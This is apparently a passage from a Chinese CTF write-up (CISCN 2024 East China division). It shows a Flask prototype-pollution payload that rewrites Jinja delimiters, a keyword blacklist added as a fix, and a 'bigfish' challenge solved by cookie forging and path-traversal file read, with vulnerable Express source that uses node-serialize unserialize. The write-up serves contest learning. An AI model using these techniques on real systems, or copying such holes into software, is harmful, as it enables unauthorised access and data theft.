class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token property">"app"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token property">"jinja_env"</span> <span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"variable_start_string"</span> <span class="token operator">:</span> <span class="token string">"[%"</span><span class="token punctuation">,</span><span class="token property">"variable_end_string"</span><span class="token operator">:</span><span class="token string">"%]"</span> <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="FIX-2"><a href="#FIX-2" class="headerlink" title="FIX"></a>FIX</h2><p>继续加已经有的黑名单就行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token keyword">import</span> os<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> json<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">generate_random_md5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    random_string <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>random_string<span class="token punctuation">)</span>    <span class="token keyword">return</span> md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklisted_patterns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'init'</span><span class="token punctuation">,</span> <span class="token string">'global'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'string'</span><span class="token punctuation">,</span><span class="token string">'secret'</span><span class="token punctuation">,</span><span class="token string">'key'</span><span class="token punctuation">,</span><span class="token string">'static'</span><span class="token punctuation">,</span><span class="token string">'folder'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pattern <span class="token keyword">in</span> blacklisted_patterns<span class="token punctuation">:</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> user_input<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Recursive merge function</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> generate_random_md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username    session<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">=</span> password    Evil <span class="token operator">=</span> evil<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> Evil<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">templates</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> username <span class="token keyword">and</span> password<span class="token punctuation">:</span>        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">"adminer"</span> <span class="token keyword">and</span> password <span class="token operator">==</span> app<span class="token punctuation">.</span>secret_key<span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"important.html"</span><span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"rt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Hello,  This is the POLLUTED page.'</span></span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="bigfish"><a href="#bigfish" class="headerlink" title="bigfish"></a>bigfish</h1><h2 id="BREAK-3"><a href="#BREAK-3" class="headerlink" title="BREAK"></a>BREAK</h2><p>访问admin路由的时候发现出现了<code>set-cookie</code>，给了两个cookie：<code>is_admin=false</code>和<code>username</code></p><p>尝试修改后传入admin路由</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623122451012.png" alt="image-20240623122451012"></p><p>成功访问</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623122644430.png" alt="image-20240623122644430"></p><p>猜测QQ管理存在任意文件读取，改存储位置为fish.js，发现可以读到</p><p>测试发现可以目录穿越，翻了一下环境变量发现没flag，还是老老实实审代码吧（</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> serialize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> schedule <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-schedule'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Change working directory to /srv</span>process<span class="token punctuation">.</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'/srv'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> rule1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">schedule<span class="token punctuation">.</span>RecurrenceRule</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>rule1<span class="token punctuation">.</span>minute <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 定时清除</span><span class="token keyword">let</span> job1 <span class="token operator">=</span> schedule<span class="token punctuation">.</span><span class="token function">scheduleJob</span><span class="token punctuation">(</span>rule1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">'data.html'</span><span class="token punctuation">,</span><span class="token string">"#获取的数据信息\n"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"wriet error"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-art-template'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data_path <span class="token operator">=</span> <span class="token string">"data.html"</span><span class="token punctuation">;</span><span class="token comment">// Middleware to set default cookies for /admin route</span><span class="token keyword">function</span> <span class="token function">setDefaultAdminCookies</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'normal'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'is_admin'</span><span class="token punctuation">,</span> <span class="token string">'false'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//主页</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>fs<span class="token punctuation">.</span><span class="token function">appendFile</span><span class="token punctuation">(</span><span class="token string">'data.html'</span><span class="token punctuation">,</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后台管理</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> setDefaultAdminCookies<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">datadir</span> <span class="token operator">:</span> data_path        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> setDefaultAdminCookies<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newname<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>data_path <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newname<span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//已弃用的登录</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/login.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>profile<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>profile<span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> obj <span class="token operator">=</span> serialize<span class="token punctuation">.</span><span class="token function">unserialize</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">escape</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//QQ</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/qq'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> data_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" 